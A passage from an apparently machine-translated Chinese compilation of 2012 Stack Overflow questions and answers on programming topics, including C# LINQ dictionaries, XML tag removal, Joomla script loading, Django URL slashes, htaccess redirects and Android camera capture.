    )
    [3] => SimpleXMLElement Object (
      [kategoria_6] => 4
      [opis_6] => 4
      [img] => slides/slide3.jpg
    )
    [4] => SimpleXMLElement Object (
      [kategoria_6] => 7
      [opis_6] => 7
      [img] => slides/slide2.jpg
    )
  )
) 
```

如何解决？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T12:36:20.733

不幸的是，SimpleXML 本身并不容易让您做您想做的事。幸运的是，[DOM](http://uk.php.net/manual/en/book.dom.php)确实（**FIXED**）：

```
// Create a new DOMDocument
$dom = new DOMDocument('1.0', 'utf-8');

// Create the DocumentElement
$documentElement = $dom->appendChild($dom->createElement('objects'));

// Loop the SimpleXML elements and import them into DOM
foreach ($val as $element) {
  $documentElement->appendChild($dom->importNode(dom_import_simplexml($element), TRUE));
}

// Save to file
$dom->save("c:\\aaa.xml"); 
```

# c# - 如何格式化 DataSet 以在单个列中包含多个数据？

> ID：10685141
> 
> 赞同：0
> 
> 时间：2012-05-21T12:18:56.083
> 
> 标签：c#

我有这样的情况：从数据库我得到像这样的数据

```
-------------------------------------------------
ID  BOOK_NAME AUTHOR REMARKS
1   ASP.Net   xyz    It is a good book.
1   ASP.Net   xyz    I like this book.
1   ASP.Net   xyz    It worth buying.
2   C#.net    abc    It is a average book.
2   C#.net    abc    It is good for beginner.
-------------------------------------------------- 
```

如您所见，我对特定书籍详细信息有多个评论。我把它作为一个数据集。我的问题是删除重复的行并将其设置为类似于 DataSet 中的内容。

```
-------------------------------------------------
ID  BOOK_NAME AUTHOR REMARKS
1   ASP.Net   xyz    It is a good book.
                     I like this book.
                     It worth buying.
2   C#.net    abc    It is a average book.
                     It is good for beginner.
-------------------------------------------------- 
```

创建数据集后，我必须使用 dataSetObj.GetXml(); 转换为 XML；

知道如何在 C# 中执行此操作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T06:44:16.393

将数据放入 DataTable

存储第一行的第一个单元格内容

从第 2 行到最后循环遍历整个网格，并检查 Name 列的值是否相同。如果相同，则用空字符串替换该值，否则继续使用新值。上述过程会不断重复

```
private void GenerateUniqueData(int cellno)
{
    //Logic for unique names

    //Step 1:

    string initialnamevalue = grdUniqueNames.Rows[0].Cells[cellno].Text;

    //Step 2:        

    for (int i = 1; i < grdUniqueNames.Rows.Count; i++)
    {

        if (grdUniqueNames.Rows[i].Cells[cellno].Text == initialnamevalue)
            grdUniqueNames.Rows[i].Cells[cellno].Text = string.Empty;
        else
            initialnamevalue = grdUniqueNames.Rows[i].Cells[cellno].Text;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:48:12.220

您可以将剩余的行保留为空白。据我所知，您无法自行创建自定义数据集。

# c# - c# 字典相交

> ID：10685142
> 
> 赞同：16
> 
> 时间：2012-05-21T12:18:56.320
> 
> 标签：c#, dictionary, key, intersect

我对 Linq / Lambda 和以下问题有疑问：

我有两个字典，primary 和secondary...这两个字典定义为Key=string，Value=int。如果 KEYS 与辅助字典相交，我需要修剪主字典。

IE：

```
primaryDict = ["thing1", 33] ["thing2", 24] ["thing3", 21] ["thing4", 17] ["thing5", 12]

secondaryDict = ["thing1", 22] ["thing3", 20] ["thing4", 19] ["thing7", 17] ["thing9", 10]

resultDict = ["thing1", 33] ["thing3", 21] ["thing4", 17] 
```

我的尝试：

```
resultDict = primaryDict.Keys.Intersect(secondaryDict.Keys).ToDictionary(t => t.Key, t.Value); 
```

这显然不起作用，因为 primaryDict.Keys.Intersect 正在返回一个键列表......我将如何重新建立一个新字典，或配对主字典？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-05-21T12:24:18.520

你可以这样做：

```
resultDict =  primaryDict.Keys.Intersect(secondaryDict.Keys)
                              .ToDictionary(t => t, t => primaryDict[t]); 
```

或者，或者：

```
resultDict =  primaryDict.Where(x => secondaryDict.ContainsKey(x.Key))
                         .ToDictionary(x => x.Key, x => x.Value); 
```

后者的效率可能稍高一些，因为它避免了创建一次性集合（由 Intersect 方法生成的集合），并且不需要第二次按键访问`primaryDict`.

**编辑**（根据评论）：

```
resultDict =  
primaryDict.Where(x => secondaryDict.ContainsKey(x.Key))
           .ToDictionary(x => x.Key, x => x.Value + secondaryDict[x.Key]); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T12:23:31.483

您仍然可以`primaryDict`在 Linq 语句中使用，因为您正在创建一个*新*字典，该字典仅在创建后才分配给您的变量：

```
resultDict = primaryDict.Keys
                        .Intersect(secondaryDict.Keys)
                        .ToDictionary(t => t, primaryDict[t]); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T12:23:31.473

未经测试：

```
resultDict = primaryDict.Keys.Intersect(secondaryDict.Keys).ToDictionary(t => t.Key, primaryDict[t.Key]); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-26T22:45:39.360

如果您想选择一个具有两个字典“值”的对象，因为这可能是您想要的，您可以尝试这样的事情。假设两个字典的键相同，即将每个字典映射在一起，就像两个系统之间的 GUID

```
dictA.Keys.Intersect(dictB.Keys).Select(x => new MyMappingClass
{
    dictAValue= dictA[x], dictBValue= dictB[x]
}) 
```

# c# - 如何删除xml中的特定标签而不会丢失c#中的数据

> ID：10685147
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:19:12.433
> 
> 标签：c#, c#-4.0, linq-to-xml, xmldocument

我正在使用 c# 处理 XML 文档。

```
<data>
    <single>
        <p xmlns="http://www.w3.org/1999/xhtml">
            <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>
        </p>
        <p xmlns="http://www.w3.org/1999/xhtml">
            <strong>dmcdnsbcdbn</strong>
        </p>
    </single>
    <single>
        <div xmlns="http://www.w3.org/1999/xhtml">
            <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>
        </div>
        <span xmlns="http://www.w3.org/1999/xhtml">
            <strong>dmcdnsbcdbn</strong>
        </span>
    </single>
</data> 
```

我想删除所有`<p>`,`<div>`和`<span>`标签。

需要的输出：

```
<data>
    <single>
        <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>
        <strong>dmcdnsbcdbn</strong>
    </single>
    <single>
        <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>
        <strong>dmcdnsbcdbn</strong>
    </single>
</data> 
```

任何人都可以建议如何使用 C# 来做到这一点。使用 XmlDocument。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T14:09:16.437

使用[HtmlAgilityPack](http://htmlagilitypack.codeplex.com/)，可以这样做：

```
HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
doc.LoadHtml(xml);

doc.DocumentNode
    .Descendants("strong")
    .ToList().ForEach(n => n.ParentNode.ParentNode.RemoveChild(n.ParentNode, true));

var newXml = doc.DocumentNode.InnerHtml; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T15:42:42.743

这是一个相当简单的正则表达式。

```
string tmp = xmlDoc.DocumentElement.InnerXml;

tmp = Regex.Replace(tmp, "<p.*>|</p>|<div.*>|</div>|<span.*>|</span>", "");

XmlDocument newDoc = new XmlDocument();
newDoc.LoadXml(tmp); 
```

这将保留数据（标签之间的所有内容），但会删除标签本身。注意：这可能会弄乱文档中的某些格式（大量空格），但它应该仍然可用。

在您给出的示例上运行此语句后，这是输出。

```
<data>
    <single>

            <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>

            <strong>dmcdnsbcdbn</strong>

    </single>
    <single>

            <strong>Hi hello bbvahvgxvzhavxhgsavxv</strong>

            <strong>dmcdnsbcdbn</strong>

    </single>
</data> 
```

我不确定您是否喜欢，您可能想要在尝试加载之前在字符串上运行 .Trim()，甚至是旨在删除标签之间所有空格的辅助正则表达式。

正则表达式模式将是

```
Regex.Replace(string, "(>) *(<)", "$1$2"); 
```

或者您可以使用“.*”而不是“*”来确保替换标签之间可能剩余的所有换行符或其他特殊字符

# php - joomla-如何从页面中删除不需要的 js 文件

> ID：10685152
> 
> 赞同：14
> 
> 时间：2012-05-21T12:19:50.687
> 
> 标签：php, joomla

joomla-如何从页面中删除不需要的 js 文件

我已经使用插件一些页面所以所有页面中都包含很多js文件

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-22T03:48:47.230

我知道有两种方法：

1）如果文档对象获取实例并删除js文件（您可以在插件中执行此操作）：

```
<?php 
         //get the array containing all the script declarations
         $document = JFactory::getDocument(); 
         $headData = $document->getHeadData();
         $scripts = $headData['scripts'];

         //remove your script, i.e. mootools
         unset($scripts['/media/system/js/mootools-core.js']);
         unset($scripts['/media/system/js/mootools-more.js']);
         $headData['scripts'] = $scripts;
         $document->setHeadData($headData);
?> 
```

2) 直接从模板 index.php 中删除 js 文件：

```
<?php unset($this->_scripts['/media/system/js/mootools-core.js']); ?> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-05-21T13:40:55.880

如果要删除 Joomla 添加的所有脚本，包括内联脚本，最快的方法是：

```
$this->_script = $this->_scripts = array(); 
```

在该部分上方的模板文件中的任何位置添加它`<head>`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:21:30.607

您可以简单地编辑这些插件代码以删除这些文件。或在不需要时卸载这些插件。

* * *

## 回答 #4

> 赞同：-7
> 
> 时间：2013-01-09T06:42:37.330

```
**An easiest way to disable mootools/ unwanted javascripts for your site in joomla cms ( 2.5 version )**(still loads it for your admin)

**Step-1:** 
Using your favorite file editor, open for edit:
libraries/joomla/document/html/renderer/head.php

**Step-2:** check for code in head.php

// Generate script file links
foreach ($document->_scripts as $strSrc => $strAttr)
{
// *** start *** //
$ex_src = explode("/",$strSrc);
$js_file_name = $ex_src[count($ex_src)-1];
$js_to_ignore = array("mootools-more.js","core.js"); // scripts to skip loading
//skip loading scripts..
if( in_array($js_file_name,$js_to_ignore) AND substr_count($document->baseurl,"/administrator") < 1 AND $_GET['view'] != 'form'){continue;}
// *** end *** //

**Step-3:** 
Clear cache & refresh page.

it works for sure.

For detailed explanation : http://www.inmotionhosting.com/support/edu/joomla-25/302-disable-mootools-in-joomla-25 
```

# mongoid - 如何动态查找嵌入的 Mongoid 文档？

> ID：10685154
> 
> 赞同：0
> 
> 时间：2012-05-21T12:19:52.783
> 
> 标签：mongoid

我的模型是：

```
class Cali
  include Mongoid::Document
  field :license_expire_date, :type => String
  field :license_issue_date, :type => String
  embeds_one :address
end

class Address
  include Mongoid::Document
  field :state, :type => String
  field :city, :type => String
  embedded_in :cali, :inverse_of => :address
end 
```

当我使用 时`@fields = Cali.fields.keys`，我只得到两个字段（`expire_date`, `issue_date`）。我没有得到结果中的地址。有没有办法可以找到嵌入的内容和其中的字段？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T15:49:10.797

这是获取关联元数据的方法。

Mongoid::Relations::Reflections#reflect_on_all_associations - 见[http://rdoc.info/github/mongoid/mongoid/Mongoid/Relations/Reflections](http://rdoc.info/github/mongoid/mongoid/Mongoid/Relations/Reflections)

请注意，如果您想提供多个宏作为当前编写的 reflect_on_all_associations 的参数，则宏必须是 args。如果你想提供一个数组，它必须被 splatted，例如 *macros，如下面的测试。

以下是“旧 API”，因此您应该改用上面的 API。

Mongoid::Relations::ClassMethods::associations - 见[http://rdoc.info/github/mongoid/mongoid/Mongoid/Relations/ClassMethods:associations](http://rdoc.info/github/mongoid/mongoid/Mongoid/Relations/ClassMethods:associations)

测试/单元/cali_test.rb

```
require 'test_helper'

class CaliTest < ActiveSupport::TestCase
  def setup
    Cali.delete_all
  end

  test "mongoid fields" do
    address = Address.new(state: 'NJ', city: 'New Providence')
    cali = Cali.create(address: address)
    assert_equal(1, Cali.count)
    macros = [:has_one, :has_many, :belongs_to, :has_and_belongs_to_many, :embeds_one, :embeds_many, :embedded_in]
    puts "Cali.reflect_on_all_associations(*macros):#{Cali.reflect_on_all_associations(*macros).inspect}"
    puts "Address.reflect_on_all_associations(*macros):#{Address.reflect_on_all_associations(*macros).inspect}"
    #puts "Old API - Cali.associations:#{Cali.associations}"
    #puts "Old API - Address.associations:#{Address.associations}"
  end
end 
```

测试输出

```
Run options: --name=test_mongoid_fields

# Running tests:

Cali.reflect_on_all_associations(*macros):[#<Mongoid::Relations::Metadata
class_name:           Address,
cyclic:               No,
dependent:            None,
inverse_of:           N/A,
key:                  address,
macro:                embeds_one,
name:                 address,
order:                nil,
polymorphic:          No,
relation:             Mongoid::Relations::Embedded::One,
setter:               address=,
versioned:            No>
]
Address.reflect_on_all_associations(*macros):[#<Mongoid::Relations::Metadata
class_name:           Cali,
cyclic:               No,
dependent:            None,
inverse_of:           address,
key:                  cali,
macro:                embedded_in,
name:                 cali,
order:                nil,
polymorphic:          No,
relation:             Mongoid::Relations::Embedded::In,
setter:               cali=,
versioned:            No>
]
.

Finished tests in 0.008605s, 116.2115 tests/s, 116.2115 assertions/s.

1 tests, 1 assertions, 0 failures, 0 errors, 0 skips 
```

# javascript - JQuery下拉菜单不会显示下拉菜单

> ID：10685155
> 
> 赞同：0
> 
> 时间：2012-05-21T12:20:07.887
> 
> 标签：javascript, jquery

我正在使用这个[动态驱动脚本来获得平滑的下拉菜单](http://www.dynamicdrive.com/dynamicindex1/ddsmoothmenu.htm)。

我的网站与菜单可以在[这里](http://dgtgroup.co.uk/ascofzco/)看到。（菜单是中间的黑条）。

一切正常，除了当您将鼠标悬停在导航链接上时，不会出现下拉菜单。

我不确定出了什么问题

任何帮助将不胜感激。

编辑：更新这是我试图[复制](http://www.ascoengineering.co.uk/)的网站。该站点上的菜单看起来很流畅。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:28:28.770

试试这个 CSS

```
.dropdown ul li a:hover ul{visibility:visible; display:block;} 
```

# jquery - jQuery 移动列表视图全尺寸标题

> ID：10685160
> 
> 赞同：0
> 
> 时间：2012-05-21T12:20:31.473
> 
> 标签：jquery, html, jquery-mobile

我正在使用 jQuery 移动基本列表来显示产品列表。（[基本列表示例](http://jquerymobile.com/demos/1.0b1/#/demos/1.0b1/docs/lists/lists-count.html)）。如果 h3 中的字符过多，则将标题截断并在末尾显示“...”。有没有办法在新行中显示完整的h3？

例如：

```
 --------------------------------------------------
   This is a super long ti...
   --------------------------------------------------
   This is a super long title
   displayed in two lines
   -------------------------------------------------- 
```

这是代码

```
<ul data-role="listview" data-theme="c">
  <li>                                   
    <a href="bar">
      <h3>Title</h3> <----
      <p>Description</p>
      <span class="ui-li-count">$12.99</span>';
    </a>
  </li>
...
</ul> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:03:15.430

我认为您需要覆盖一些应用于这些列表视图标题的 JQM css 样式：

```
<h3 style="word-wrap: break-word; white-space: pre-wrap;"> long title here </h3> 
```

在此处查看此示例：http: [//jsfiddle.net/shanabus/DTNJ4/](http://jsfiddle.net/shanabus/DTNJ4/)

希望这可以帮助！

# entity-framework - 实体框架是否有模型驱动的编辑器？

> ID：10685163
> 
> 赞同：3
> 
> 时间：2012-05-21T12:20:39.837
> 
> 标签：entity-framework, linqpad, utilities, model-driven-development

模型驱动开发的想法是自动化其他重复性任务。

LinqPad 可以加载程序集和可选的连接字符串并开始查询数据库。

以同样的方式，应该可以编写一个编辑器，您可以在其中 CRUD 对象。我一直在使用的一些 ORM 工具提供了这样的编辑器。

EF 是否存在该编辑器？

# android - 安卓上的多重射击

> ID：10685165
> 
> 赞同：0
> 
> 时间：2012-05-21T12:20:50.920
> 
> 标签：android, camera, photos

要完成的任务：在几分之一秒内拍摄多张照片，在 1 秒内至少拍摄 2 张​​照片。

试过（2张照片）：1）同时/循环调用两个takePicture（....）方法，但应用程序崩溃。2) 在onPictureTaken(..) 中调用第一个takePicture(..) 方法，然后调用另一个takePicture(..) 方法。这行得通，但是太慢了。这两个镜头之间的时间差约为 1 秒，这对我的应用程序来说不是一个可取的结果。

问题：如何以几毫秒的时间差拍摄多张照片？

（我正在使用 android 2.3.3）。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:46:32.397

这只有在配备 ZSL（零快门延迟）相机的新型设备上才有可能。我相信目前只有 mytouch 4g slide、galaxy nexus 和 HTC one x，以及即将推出的 evo 4g lte 和三星 Galaxy3 手机。对于安卓手机来说，这是一个相对较新的功能

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-24T21:15:25.450

我使用了回调函数 setOneShotPreviewCallback (Camera.PreviewCallback cb) 并解决了问题。这会抓取一个预览帧，并让您在转换为某种可用格式 (RGB) 后将该帧用作图像。由于 android 支持每秒 20-30 帧，具体取决于设备，因此您可以在几分之一秒内拍摄几帧。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:25:47.393

我认为为此手机必须植根，并且您必须修改一些操作系统文件...

# actionscript-3 - 停止 ArrayCollection 不断排序（仅排序一次）

> ID：10685166
> 
> 赞同：0
> 
> 时间：2012-05-21T12:20:51.630
> 
> 标签：actionscript-3, sorting, apache-flex, air, flex4.5

我有一个由包含模型类实例的 ArrayCollection 传播的列表。该模型类具有对保存库存值的字典的类引用。自然，这些值会不断刷新。

当我将排序函数应用于 ArrayCollection 时，我确实得到了正确的排序，但是排序函数不断运行，但我只需要它运行一次。因此，在第一次对 ArrayCollection 进行排序后，排序应该立即停止。

单击标题按钮会触发我的排序功能（我正在开发针对移动设备优化的基于列表的 DataGrid，因此不仅不需要不断对 ArrayCollection 进行排序，而且还需要太多性能），如下所示：

```
private function headerClick(event:MouseEvent):void {

    sField = event.currentTarget.id;        
    var sort:Sort = new Sort();
    sort.compareFunction = fidSort;

    (_list.dataProvider as ArrayCollection).sort = sort;
    (_list.dataProvider as ArrayCollection).refresh();
}

private function fidSort(a:Object, b:Object, fields:Array = null):int {

    if(a.fidList.fidMap[sField].fieldValue == b.fidList.fidMap[sField].fieldValue) {
        return 0;
    } else if(a.fidList.fidMap[sField].fieldValue > b.fidList.fidMap[sField].fieldValue) {
       return 1;
    } else{
       return -1;
    }
} 
```

那么，除了简单地在函数末尾放置一个布尔值来停止排序之外，还有其他方法可以停止排序过程吗？这意味着该函数仍会随着值的每次更新而被调度，这是一种相当不受欢迎的行为。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T16:41:44.960

Al_Birdy 是对的，这是 a `ListCollectionView`（`ArrayCollection`扩展）的默认行为。 `ListCollectionView`定义了一个名为的方法`disableAutoUpdate()`，该方法将防止 CollectionChange 和 PropertyChange 事件在项目更改时被集合分派。

这应该会停止触发您的排序。它仍然不理想，当您调用此方法时，集合显然会跟踪所有更改，因此如果您稍后调用`enableAutoUpdate()`.

要解决此问题，您可能只想自己对数据进行排序，然后`ArrayCollection`使用已排序的数据创建一个。

# jquery-mobile - jquery-mobile：标签+输入+标签在一些行

> ID：10685167
> 
> 赞同：2
> 
> 时间：2012-05-21T12:20:57.457
> 
> 标签：jquery-mobile

我有一个表单，其中包含一些我想在行中显示的输入，但它在宽度很小之前就中断了行。这是代码：

```
<div data-role='fieldcontain' id='TempLimits'>
<label for='Tmin' style='display-inline;width:50px'> Min.:</label>
<input type='text' name='Tmin' id='Tmin' value='0' style='display:inline;width:50px' />
<label for='Tmin' style='display-inline;width:50px'> ºC</label>
<br>
<label for='Tmax' style='display-inline;width:50px'>Max.:</label>
<input type='text' name='Tmax' id='Tmax' value='60' style='display:inline;width:50px' />
<label for='Tmax' style='display-inline;width:50px'> ºC</label> 
```

这是显示我想要保留的内容以及问题所在的图像（我不能直接通过声誉发布）：

[在行标签](http://img535.imageshack.us/img535/1690/forminline.png) [中 不在行标签中](http://img688.imageshack.us/img688/8765/formnoinline.png)

此外，有什么方法可以让标签与输入的中心/底部而不是输入的顶部对齐？

非常感谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T13:02:46.190

将 css 样式附加`float: left`到元素上，它会自动转到下一行。

我认为这应该适用于第一行：

`<label for='Tmin' style='width:50px'> Min.:</label> <input type='text' name='Tmin' id='Tmin' value='0' style='float: left; width:50px' /> <label for='Tmin' style='float: left; width:50px'> ºC</label>`

# javascript - 如何在 javascript 中从 JSON 中获取值

> ID：10685171
> 
> 赞同：-2
> 
> 时间：2012-05-21T12:21:10.967
> 
> 标签：javascript, json

如何从 javascript 中的 JSON 获取值是我的代码

```
var obj={"0.5":0.009333, "0.21":0.048667,"0.31":0.070667};
    var value =0.21;
    var p=0;
    for(i=0; i<= obj.length ;i++){
    if(value== obj[i]){                         
           p = obj[i];                   //here i want p=0.048667
           console.log("psr is :"+p);
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:23:12.993

呃...不会只是`obj[value]`做的伎俩？)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:27:30.970

Javascript 不支持 obj.length。您将不得不使用

```
for(var index in object) {
    var p = object[index];
    console.log(p);
} 
```

但是当然，如​​果您已经知道您的密钥，那么

```
console.log(object[key]); 
```

是要走的路。完整的代码变成

```
var obj = {"0.5":0.009333, "0.21":0.048667,"0.31":0.070667};
var value = "0.21";
var p = obj[value];
console.log(p); 
```

# mongodb - MongoDB 如何评估多个 $and 语句？

> ID：10685172
> 
> 赞同：1
> 
> 时间：2012-05-21T12:21:14.260
> 
> 标签：mongodb, mongodb-query

在较早的一个[问题](https://stackoverflow.com/questions/9738277/how-does-mongodb-evaluates-multiple-or-statements)中，我发现 MongoDB 对每个`$or`语句执行多个查询，并且重复项在后处理中被丢弃。查询是如何`$and`实现的？

是否有某种优化，如果第一条语句为 FALSE，则文档被丢弃？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T18:17:21.560

$and 语句与 $or 语句有很大不同。由于 $and 在定义上具有限制性，因此 $and 表达式的任何单个子句都可以用作单个查询来获取文档以进行进一步评估。MongoDB 检查可用索引以优化并选择要运行的查询。然后根据剩余子句的 AND 评估每个结果。正如您可能猜到的那样，这比 $or 语句要容易得多。

# django - 没有添加 django 斜杠

> ID：10685178
> 
> 赞同：5
> 
> 时间：2012-05-21T12:21:41.483
> 
> 标签：django

所以我有一个 django 应用程序，我访问了这个网址：

```
http://127.0.0.1:8000/stories 
```

我明白了：

```
Request Method:     GET

Request URL:    http://127.0.0.1:8000/stories

"stories" does not exist 
```

然后我检查了 urls.py，我看到了：

```
#stories
url(r'^stories/$',
    StoryShowView.as_view(
        context_object_name='story_list',
        template_name='accounts/viewAndAddStory.html')
), 
```

最后，我查看了我的 settins.py，我看到了：

```
#appends a slash if nothing is found without a slash.
APPEND_SLASH = True 
```

不应该，如上设置的 APPEND_SLASH，不带斜线的 url 被 301 重定向到带斜线的 url，然后网页加载？

如果我*手动*将斜杠添加到 url，那么页面会按预期加载，每个人都会喝茶并早点结束。

更新：

我的 settings.py 中也有这个条目：

```
MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
) 
```

更新：

当我尝试访问 url 时，来自页面上的错误消息：

> Django 版本：1.3.1

已解决：所以 okm 很赚钱，亲爱的。问题是我的网址 - 在底部，我有这个：

```
if settings.DEBUG:
    urlpatterns += patterns('',
        url(r'^%s(?P<path>.*)$' % settings.MEDIA_URL[1:],
        'django.views.static.serve',
        {'document_root': settings.MEDIA_ROOT, 'show_indexes': True})
    ) 
```

然而，我没有做的是 MEDIA_URL 和 MEDIA_ROOT 没有输入我的`settings.py`- 它们都是空字符串（''）

所以 url 查找的事情是找到我输入的所有 url，认为它们是 css 条目。我输入了 media_root（我的 css 等文件所在的文件夹）和 media_url（我用来指示获取静态文件的 url）的值，一切都很好。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-21T14:17:10.153

`"does not exist"`应该是这样的`"Page not found"`。因此，我怀疑您面临的不是正常的 404，而是由错误配置的 urlconf 中的某些不匹配视图引发的 404。例如，我发现`django.views.static.serve`会引发`Http404('some_path does not exist')`，您可以检查`urls.py`以确保诸如`static.serve`不匹配路径之类的视图`/stories`吗？

如果有匹配，Django 将不会附加后缀斜杠并自动重定向。

你可以检查

```
from django.core.urlresolvers import resolve
resolve('/stories') 
```

知道哪个视图实际匹配。

# php - 使用 htaccess 更改应用程序域

> ID：10685180
> 
> 赞同：0
> 
> 时间：2012-05-21T12:21:44.787
> 
> 标签：php, .htaccess, hosting

我在宝塔盒子上托管了一个应用程序，我的应用程序安装有一个类似 wm-app.pagodabox.com 的 url。我为例如 app.com 添加了一个 DNS 别名，它给了我一个 IP 来指向我的 A 记录。我做到了，它工作得很好。

现在的问题是我去 app.com 它将域重定向到 wm-app.pagodabox.com。

Pagoda-Box 说我可以使用简单的 apache URL 重写来解决这个问题。我一直不明白重写。我只用它来从我的 URL 中删除 index.php，其代码在网上广泛可用。我不希望任何访问我的网站的用户看到 app.com 而不是 wm-app.pagodabox.com

到目前为止，这是我所拥有的（我感觉我错了）：

```
RewriteCond %{HTTP_HOST} ^wm-app.pagodabox.com[nc]
RewriteRule ^(.*)$ app.com/$1 [r=301,nc] 
```

我感谢所有的帮助。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:23:53.330

您的代码中有一些小错误

```
RewriteEngine On
RewriteBase /

RewriteCond %{HTTP_HOST} ^wm-app\.pagodabox\.com [NC]
RewriteRule ^(.*)$ http://app.com/$1 [R=301]

# might work but not very likely
RewriteCond %{HTTP_HOST} ^app\.com [NC]
RewriteRule ^(.*)$ - [L] 
```

这在正常情况下应该几乎可以工作，但如果你的情况是，已经有一些东西以相反的方式进行重定向。所以我猜上面的代码，结合现有的重定向，将导致重定向网球比赛（来回重定向）

# python - Python“对象”类。它只是空白还是有更多内容？

> ID：10685183
> 
> 赞同：2
> 
> 时间：2012-05-21T12:21:57.790
> 
> 标签：python, class, inheritance

我正在尝试查找有关 Python 基类的更多信息：`object`但找不到任何信息。它只是类似`class object: pass`并且不值得更多关注还是......？

我在哪里可以找到更多关于它的信息。其他类从它继承什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:24:21.247

[这里](http://eli.thegreenplace.net/2012/04/03/the-fundamental-types-of-python-a-diagram/)有一些很好的信息（以及从那里链接的其他文章）。这是图表：

![在此处输入图像描述](../Images/19902675facd63586dc53bf850095d87.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T12:23:18.773

一些基本的东西供其他对象使用。

```
>>> dir(object())
['__class__', '__delattr__', '__doc__', '__format__', '__getattribute__', 
'__hash__', '__init__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', 
'__setattr__', '__sizeof__', '__str__', '__subclasshook__'] 
```

有关这些方法的更多信息，请查看[http://docs.python.org/reference/datamodel.html](http://docs.python.org/reference/datamodel.html)，以下是它们的实现方式[http://hg.python.org/cpython/file/3d4d52e47431/Objects/对象.c](http://hg.python.org/cpython/file/3d4d52e47431/Objects/object.c)。

# jquery - 使用 jquery 更改参数值

> ID：10685185
> 
> 赞同：0
> 
> 时间：2012-05-21T12:22:06.413
> 
> 标签：jquery, param

当我单击链接时，我需要使用 jquery 更改对象参数值。我尝试了这些解决方案，但它们在 ie 中不起作用：

```
$('a.link-video').live('click',function(){
    $('.object-video', $(this).parent().parent()).param({name : 'flashvars', value : 'pathFile=' + $(this).attr('href')});
    return false;
}); 
```

和

```
$('a.link-video').live('click',function(){
    $('.object-video param[name="flashvars"]', $(this).parent().parent()).attr('value', $(this).attr('href')});
    return false;
}); 
```

我能怎么做？

谢谢， 马蒂亚

# android - 从安装到 android 设备的 Appcelerator 移动应用程序本地运行的访问服务器

> ID：10685187
> 
> 赞同：0
> 
> 时间：2012-05-21T12:22:34.903
> 
> 标签：android, tomcat, android-emulator, appcelerator

我有一个在我的机器上本地运行的 Spring Restful API 服务器。

我通过 Eclipse 的服务器选项卡将它作为 Tomcat 应用程序服务器启动/停止。

我还构建了一个调用此服务器的***Appcelerator应用程序。***

***当我通过Titatium Studio中的******Android Emulator***选项运行我的应用程序时，它会从我的本地服务器连接并检索数据。请求是：

 *```
var TRANSACTIONS_URL = 'http://myipaddress:8080/PurchaseAPIServer/api/purchase'; 
```

当我通过 USB 电缆（在开发人员模式下）将我的 android 设备连接到机器并使用***Titanium Studio在******Android 设备***上安装/运行应用程序时遇到问题。

 *我本地运行的服务器从未被击中。

我已经尝试过本文中提到的选项，但没有运气： [Accessing webserver running within Eclipse from outside the工作站](https://stackoverflow.com/questions/1621796/accessing-webserver-running-within-eclipse-from-outside-the-workstation/1630532#1630532)

有没有办法解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:03:02.453

将我的三星 Galaxy S2 连接到本地 wifi 连接（使用相同 wifi 的 PC）解决了这个问题。一旦安装在设备上，当然也不需要 USB 电缆。

以下链接可能有用：
[Accessing localhost of PC from USB connected Android mobile device](https://stackoverflow.com/questions/4779963/how-can-i-access-my-localhost-from-my-android-device)

[如何从我的 android 设备访问我的本地主机？](https://stackoverflow.com/questions/4779963/how-can-i-access-my-localhost-from-my-android-device)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T10:00:37.610

您是否尝试通过 USB 电缆发送请求来对此进行测试？USB不使用IP地址进行通信，所以我不确定它到底是如何工作的。

如果您将两者都连接到 wifi 源，这应该可以正常工作，我过去自己也这样做过。这也更有意义，好像这是为了作为应用程序发布，用户不会通过 USB 连接到您的服务器。**

# javascript - 如何从嵌入中获取url数据并将其保存到数据库中

> ID：10685189
> 
> 赞同：1
> 
> 时间：2012-05-21T12:22:41.980
> 
> 标签：javascript, jquery, ajax, embed

